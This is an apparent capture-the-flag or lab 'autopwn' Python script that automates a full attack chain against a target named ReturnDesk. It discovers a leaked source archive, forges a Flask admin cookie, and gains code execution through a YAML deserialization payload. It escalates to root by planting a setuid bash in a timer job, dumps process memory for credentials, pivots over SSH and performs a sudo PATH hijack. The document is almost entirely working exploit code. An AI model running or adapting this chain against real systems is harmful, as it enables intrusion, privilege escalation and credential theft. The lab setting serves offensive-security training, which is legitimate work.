#!/usr/bin/env python3
"""
Autopwn helper for ReturnDesk.

Dependencies on the attacker host:
    pip install requests flask

The script automates the intended lab chain from the web target alone:
source artifact discovery, Flask cookie signing, YAML RCE, ReturnDesk Web
root escalation, archive sync memory-dump pivot, and ArchiveNode sudo PATH
hijack through SSH from the compromised web host.
"""

import argparse
import base64
import json
import re
import secrets
import shlex
import sys
import time
import tarfile
from pathlib import Path
from urllib.parse import urljoin

import requests

SECRET_RE = re.compile(r"FLASK_SECRET_KEY=([a-f0-9]+)")
ARCHIVE_RE = re.compile(
    r"ARCHIVE_HOST=(?P<host>(?:\d{1,3}\.){3}\d{1,3});"
    r"ARCHIVE_USER=(?P<user>[A-Za-z0-9_-]+);"
    r"ARCHIVE_PASS=(?P<password>[^;\"'\s]+)"
)
STATIC_DIR = "/opt/returndesk/app/static"
ROOT_SHELL = "/tmp/rd-rootbash"
HTTP_TIMEOUT = 10
SESSION = requests.Session()
SESSION.trust_env = False


def stage(message):
    print(f"\n=== {message} ===", flush=True)


def log(message):
    print(f"[+] {message}", flush=True)


def warn(message):
    print(f"[!] {message}", flush=True)


def quote(value):
    return shlex.quote(value)


def flask_cookie(secret):
    try:
        from flask.sessions import SecureCookieSessionInterface
        from flask import Flask
    except ImportError as exc:
        raise SystemExit("Install Flask on the attacker host: pip install flask") from exc

    app = Flask("signer")
    app.secret_key = secret
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    return serializer.dumps({"role": "admin"})


def discover_source(base_url):
    log(f"Accessing build metadata at {urljoin(base_url, '/api/build-info')}")
    info = SESSION.get(urljoin(base_url, "/api/build-info"), timeout=HTTP_TIMEOUT)
    info.raise_for_status()
    artifact = info.json()["artifact"]

    log(f"Found release artifact name: {artifact}")
    log(f"Accessing leaked release file at {urljoin(base_url, f'/releases/{artifact}')}")
    release = SESSION.get(urljoin(base_url, f"/releases/{artifact}"), timeout=HTTP_TIMEOUT)
    release.raise_for_status()
    return artifact, release.content


def safe_extract_tar_gz(archive, workdir):
    root = workdir.resolve()
    with tarfile.open(archive, "r:gz") as tar:
        for member in tar.getmembers():
            target = (root / member.name).resolve()
            if root != target and root not in target.parents:
                raise RuntimeError(f"Refusing unsafe archive member: {member.name}")
        tar.extractall(root)


def extract_secret(artifact_name, archive_bytes, workdir):
    archive = workdir / artifact_name
    archive.write_bytes(archive_bytes)
    log(f"Saved release archive to {archive}")
    log("Extracting release archive safely")
    safe_extract_tar_gz(archive, workdir)

    for env_file in workdir.rglob(".env"):
        match = SECRET_RE.search(env_file.read_text())
        if match:
            log(f"Found Flask secret key in extracted file: {env_file}")
            log(f"FLASK_SECRET_KEY={match.group(1)}")
            return match.group(1)
    raise RuntimeError("FLASK_SECRET_KEY not found in source archive")


def yaml_os_system(command):
    return "!!python/object/apply:os.system\n- " + json.dumps(command) + "\n"


def send_yaml_command(base_url, cookie, command, label="command", log_response=True):
    response = SESSION.post(
        urljoin(base_url, "/admin/import-policy"),
        cookies={"session": cookie},
        files={"policy": ("policy.yml", yaml_os_system(command), "application/x-yaml")},
        timeout=HTTP_TIMEOUT,
    )
    if log_response:
        log(f"YAML {label} HTTP status: {response.status_code}")
    response.raise_for_status()
    return response


def fetch_static(base_url, name):
    response = SESSION.get(urljoin(base_url, f"/static/{name}"), timeout=HTTP_TIMEOUT)
    if response.status_code == 404:
        return None
    response.raise_for_status()
    return response.text


def wait_for_static(base_url, name, timeout=90, interval=3):
    deadline = time.time() + timeout
    while time.time() < deadline:
        content = fetch_static(base_url, name)
        if content is not None:
            return content
        time.sleep(interval)
    raise TimeoutError(f"Timed out waiting for /static/{name}")


def wait_for_command_output(base_url, cookie, command, name, label, timeout=90, interval=3):
    send_yaml_command(base_url, cookie, f"{command} > {STATIC_DIR}/{name} 2>&1", label)
    try:
        return wait_for_static(base_url, name, timeout=timeout, interval=interval)
    except TimeoutError as exc:
        raise TimeoutError(
            f"Timed out waiting for /static/{name}. "
            f"Check that {STATIC_DIR} is writable by the returndesk user; "
            "verify the ReturnDesk Web build script was applied successfully."
        ) from exc


def plant_root_timer_payload(base_url, cookie, token):
    name = f"{token}-plant-root-payload.txt"
    payload = "\n".join(
        [
            "#!/usr/bin/env bash",
            f"cp /bin/bash {ROOT_SHELL}",
            f"chmod 4755 {ROOT_SHELL}",
            "",
        ]
    )
    encoded = base64.b64encode(payload.encode()).decode()
    command = (
        "{ "
        f"printf %s {quote(encoded)} | base64 -d > /opt/returndesk/jobs/reconcile.sh && "
        "chmod +x /opt/returndesk/jobs/reconcile.sh && "
        "ls -l /opt/returndesk/jobs/reconcile.sh && "
        "sed -n '1,5p' /opt/returndesk/jobs/reconcile.sh; "
        f"}} > {STATIC_DIR}/{name} 2>&1"
    )
    send_yaml_command(base_url, cookie, command, "root timer payload")
    result = wait_for_static(base_url, name)
    if ROOT_SHELL not in result:
        raise RuntimeError(
            "Failed to plant the root timer payload into "
            f"/opt/returndesk/jobs/reconcile.sh:\n{result}"
        )
    log("Verified writable reconciliation script contains the root payload")


def run_as_root(base_url, cookie, command, label):
    wrapped = f"{ROOT_SHELL} -p -c {quote(command)}"
    send_yaml_command(base_url, cookie, wrapped, label)


def run_as_real_root(base_url, cookie, command, label):
    python = (
        "import os, subprocess; "
        "os.setgid(0); "
        "os.setuid(0); "
        f"subprocess.run({json.dumps(command)}, shell=True)"
    )
    wrapped = f"{ROOT_SHELL} -p -c {quote('python3 -c ' + quote(python))}"
    send_yaml_command(base_url, cookie, wrapped, label)


def wait_for_root_shell_ready(base_url, cookie, token, timeout=150, interval=3):
    name = f"{token}-root-shell-ready.txt"
    deadline = time.time() + timeout
    command = (
        f"if test -u {ROOT_SHELL} && test -x {ROOT_SHELL}; then "
        f"echo ready > {STATIC_DIR}/{name}; "
        "fi"
    )
    log(f"Polling for {ROOT_SHELL} to be created by returndesk-reconcile.timer")
    while time.time() < deadline:
        send_yaml_command(base_url, cookie, command, "root payload readiness check", log_response=False)
        content = fetch_static(base_url, name)
        if content is not None and "ready" in content:
            return
        time.sleep(interval)
    diag_name = f"{token}-root-timer-diagnostics.txt"
    diag_command = (
        "{ "
        "echo '[timer]'; systemctl list-timers --all returndesk-reconcile.timer; "
        "echo '[service]'; systemctl status --no-pager returndesk-reconcile.service; "
        "echo '[unit]'; systemctl cat returndesk-reconcile.service; "
        "echo '[script]'; ls -l /opt/returndesk/jobs/reconcile.sh; "
        "sed -n '1,10p' /opt/returndesk/jobs/reconcile.sh; "
        "echo '[root shell]'; ls -l /tmp/rd-rootbash; "
        f"}} > {STATIC_DIR}/{diag_name} 2>&1"
    )
    send_yaml_command(base_url, cookie, diag_command, "root timer diagnostics")
    diagnostics = fetch_static(base_url, diag_name) or "diagnostics unavailable"
    if "/dev/tcp/" in diagnostics or "bash -i" in diagnostics:
        raise RuntimeError(
            "returndesk-reconcile.service is still occupied by an earlier root "
            "reverse shell, so systemd cannot start the updated payload. Exit "
            "the old root shell from the manual walkthrough, close the listener, "
            "then rerun autopwn. For a clean submission demo, run autopwn against "
            "a fresh or rebuilt ReturnDesk Web machine.\n\n"
            "Timer diagnostics from the target:\n"
            f"{diagnostics}"
        )
    raise TimeoutError(
        f"Timed out waiting for {ROOT_SHELL}. "
        "Timer diagnostics from the target:\n"
        f"{diagnostics}"
    )


def wait_for_root_output(base_url, cookie, command, name, label, timeout=90, interval=3):
    deadline = time.time() + timeout
    while time.time() < deadline:
        run_as_root(base_url, cookie, f"{command} > {STATIC_DIR}/{name} 2>&1", label)
        content = fetch_static(base_url, name)
        if content is not None:
            return content
        time.sleep(interval)
    raise TimeoutError(f"Timed out waiting for root command output /static/{name}")


def dump_archive_credentials(base_url, cookie, token):
    name = f"{token}-archive-creds.txt"
    command = (
        "pid=$(pgrep -f '[a]rchive-sync-agent.py' | head -n1); "
        "if [ -n \"$pid\" ]; then "
        f"echo \"archive-sync-agent pid=$pid\" > {STATIC_DIR}/{name}; "
        f"gcore -o /tmp/archive-sync \"$pid\" >> {STATIC_DIR}/{name} 2>&1; "
        f"strings /tmp/archive-sync.\"$pid\" | grep 'ARCHIVE_' >> {STATIC_DIR}/{name} 2>&1; "
        "else "
        f"echo 'archive-sync-agent process not found' > {STATIC_DIR}/{name}; "
        "fi"
    )
    run_as_real_root(base_url, cookie, command, "archive credential dump")
    content = wait_for_static(base_url, name)
    match = ARCHIVE_RE.search(content)
    if not match:
        raise RuntimeError(f"Could not recover ArchiveNode credentials from memory dump:\n{content}")
    return match.groupdict(), content


def run_archive_ssh_script(base_url, cookie, creds, token, script, name_suffix, label, timeout=45):
    name = f"{token}-{name_suffix}.txt"
    askpass = "/tmp/rd-askpass"
    command = (
        f"printf '#!/bin/sh\\necho %s\\n' {quote(creds['password'])} > {askpass}; "
        f"chmod +x {askpass}; "
        f"DISPLAY=x SSH_ASKPASS={askpass} setsid ssh "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/tmp/rd-known-hosts "
        "-o PreferredAuthentications=keyboard-interactive,password "
        "-o KbdInteractiveAuthentication=yes "
        "-o PasswordAuthentication=yes "
        "-o NumberOfPasswordPrompts=2 "
        "-o PubkeyAuthentication=no "
        f"{quote(creds['user'] + '@' + creds['host'])} "
        f"{quote('bash -s')} > {STATIC_DIR}/{name} 2>&1 <<'REMOTE'\n"
        f"{script}"
        "REMOTE\n"
    )
    run_as_root(base_url, cookie, command, label)
    return wait_for_static(base_url, name, timeout=timeout)


def read_archive_local_flag(base_url, cookie, creds, token):
    script = "\n".join(
        [
            "set -e",
            "id",
            "cat /home/archadmin/local.txt",
            "",
        ]
    )
    return run_archive_ssh_script(
        base_url,
        cookie,
        creds,
        token,
        script,
        "archive-local",
        "ArchiveNode local flag read",
    )


def run_archive_path_hijack(base_url, cookie, creds, token):
    remote_script = "\n".join(
        [
            "set -e",
            "mkdir -p /home/archadmin/bin",
            "cat > /home/archadmin/bin/cleanup-manifests <<'EOF'",
            "#!/usr/bin/env bash",
            "id",
            "cat /root/proof.txt",
            "EOF",
            "chmod +x /home/archadmin/bin/cleanup-manifests",
            "sudo /usr/local/bin/archive-maint",
            "",
        ]
    )
    return run_archive_ssh_script(
        base_url,
        cookie,
        creds,
        token,
        remote_script,
        "archive-root",
        "ArchiveNode PATH hijack",
        timeout=45,
    )


def main():
    parser = argparse.ArgumentParser(description="Autopwn ReturnDesk: Dead Letter Queue")
    parser.add_argument("target", help="ReturnDesk web base URL or host")
    parser.add_argument("--workdir", default="autopwn-output")
    args = parser.parse_args()

    base_url = args.target if args.target.startswith("http") else f"http://{args.target}"
    workdir = Path(args.workdir) / secrets.token_hex(4)
    workdir.mkdir(parents=True, exist_ok=True)
    token = "rd-" + secrets.token_hex(6)

    stage("Stage 1: ReturnDesk Web Initial Access and User Flag")
    artifact_name, archive_bytes = discover_source(base_url)
    secret = extract_secret(artifact_name, archive_bytes, workdir)
    log("Forging Flask session cookie with role=admin")
    cookie = flask_cookie(secret)
    log(f"Forged admin session cookie: {cookie}")
    log("Authenticating to the application by sending the forged cookie to the admin YAML import endpoint")

    local_name = f"{token}-local.txt"
    local = wait_for_command_output(
        base_url,
        cookie,
        "cat /home/returndesk/local.txt",
        local_name,
        "user flag read",
        timeout=90,
    ).strip()
    log(f"USER FLAG /home/returndesk/local.txt: {local}")

    stage("Stage 2: ReturnDesk Web Privilege Escalation and Root Flag")
    web_root_name = f"{token}-proof.txt"
    plant_root_timer_payload(base_url, cookie, token)
    log("Planted payload into writable root-run reconciliation job")
    log("Waiting for the reconciliation timer to execute the root payload")
    wait_for_root_shell_ready(base_url, cookie, token, timeout=150)
    log("Root payload is ready")
    web_root = wait_for_root_output(
        base_url,
        cookie,
        "cat /root/proof.txt",
        web_root_name,
        "web root flag read",
        timeout=30,
    ).strip()
    log(f"ROOT FLAG /root/proof.txt: {web_root}")

    stage("Stage 3: ArchiveNode Initial Access and User Flag")
    log("Dumping archive-sync-agent process memory as root")
    creds, raw_creds = dump_archive_credentials(base_url, cookie, token)
    log("Archive sync memory dump hit:")
    print(raw_creds.strip())
    log(f"Recovered ArchiveNode host: {creds['host']}")
    log(f"Recovered ArchiveNode user: {creds['user']}")
    log(f"Recovered ArchiveNode password: {creds['password']}")
    log("Connecting from ReturnDesk Web to ArchiveNode over the internal network")
    archive_local_output = read_archive_local_flag(base_url, cookie, creds, token)
    log("ArchiveNode local output:")
    print(archive_local_output.strip())
    archive_local_match = re.search(r"(?m)^[a-f0-9]{32}$", archive_local_output)
    if archive_local_match:
        log(f"ARCHIVENODE USER FLAG /home/archadmin/local.txt: {archive_local_match.group(0)}")
    else:
        raise RuntimeError(f"ArchiveNode local flag was not recovered:\n{archive_local_output}")

    stage("Stage 4: ArchiveNode Privilege Escalation and Root Flag")
    log("Dropping malicious cleanup-manifests earlier in PATH and running sudo archive-maint")
    archive_output = run_archive_path_hijack(base_url, cookie, creds, token)
    log("ArchiveNode output:")
    print(archive_output.strip())
    proof_match = re.search(r"(?m)^[a-f0-9]{32}$", archive_output)
    if proof_match:
        log(f"FINAL ROOT FLAG /root/proof.txt: {proof_match.group(0)}")
    else:
        raise RuntimeError(f"ArchiveNode proof was not recovered:\n{archive_output}")

    log("Autopwn chain complete")

if __name__ == "__main__":
    sys.exit(main())
